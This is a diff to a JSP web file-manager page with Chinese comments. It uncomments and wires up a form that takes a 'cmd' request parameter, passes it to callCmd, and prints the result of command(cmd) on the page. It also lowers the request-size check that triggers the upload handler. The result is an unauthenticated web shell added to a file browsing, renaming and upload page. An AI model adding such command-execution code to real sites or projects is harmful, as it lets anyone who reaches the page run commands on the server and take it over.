@@ -50,7 +50,6 @@
  background-repeat:space;
  background-size:100% 1080px;
  background-attachment:scroll;
- background-image:url(http://pic1.win4000.com/wallpaper/4/57e3770961389.jpg);
  color:black;
  font:18px red 微软雅黑
  }
@@ -60,8 +59,7 @@
  a:visited{color:black}
  td{text-align:left;padding-left:20px;border:1px #B0C4DE solid;height:21px;color:black}
  table{position:relative;cellspacing:0;cellpadding:0;border-spacing:0;border:1px #B0C4DE solid;width:80%;margin-left:10%;margin-right:10%;margin-top:0}
-/*  #file{color:yellow;background-color:red;} */
-/*  #folder{color:red;background-color:yellow} */
+ #forcmd{position: relative;width:80%;margin-top:20px;margin-left: 10%;}
  .list{position:relative;top:0}
  .filelist{position:absolute;top:-1px}
 </style>
@@ -84,12 +82,14 @@ url=request.getRequestURI();
 action=request.getParameter("action");
 dir=request.getParameter("dir");
 oldname=request.getParameter("oldName");
+String cmd=request.getParameter("cmd");
+System.out.println(cmd);
 newname=request.getParameter("newName");
 o =res.getWriter();
 msg=dir=dir==null?"":decode(dir);
 if(newname!=null){
  msg=rename(newname,oldname);   
-}else if(request.getContentLengthLong()>180){
+}else if(request.getContentLengthLong()>10){
 load(request,response);
 }
 %>
@@ -198,7 +198,7 @@ static void load(HttpServletRequest request, HttpServletResponse response)
 					  str=reader.readLine();				     
 					  System.out.println("编辑文件");
 					  System.out.println("普通文本域表单值"+str);
-					 // callCmd(cmd);
+					  callCmd(cmd);
 				} else {//如果是文件上传表单
 					StringTokenizer Fn= new StringTokenizer(str,"\\\"");
 					while(Fn.hasMoreElements()){//获取文件名
@@ -494,16 +494,17 @@ if(dir!=""){
 	}
 }
 %>
-<!-- <form id="forcmd"  enctype="multipart/form-data" method="post" style="position:relative; top: 50%"> -->
-<!--     <input type="text" name="cmd" value="help" size="21">   -->
-<!--  	<input type="submit" value="提交"> -->
-<!-- </form> -->
-<%-- <%! static void callCmd(String cmd){ %> --%>
-<!-- 	<textarea rows="30" cols="72"> -->
-<%-- 	<%=command(cmd)%> --%>
-<!-- 	</textarea> -->
-<%-- 	<%!} %> --%>
-
+<div id="forcmd">
+<form   enctype="multipart/form-data" method="post" style="position:relative; top: 50%">
+    <input type="text" name="cmd" value="help" size="21">  
+ 	<input type="submit" value="提交">
+</form><br/>
+<%! static void callCmd(String cmd){ %>
+	<textarea rows="30" cols="72">
+	<%=command(cmd)%>
+	</textarea>
+	<%!} %>
+</div>
 
 </body>
 </html>
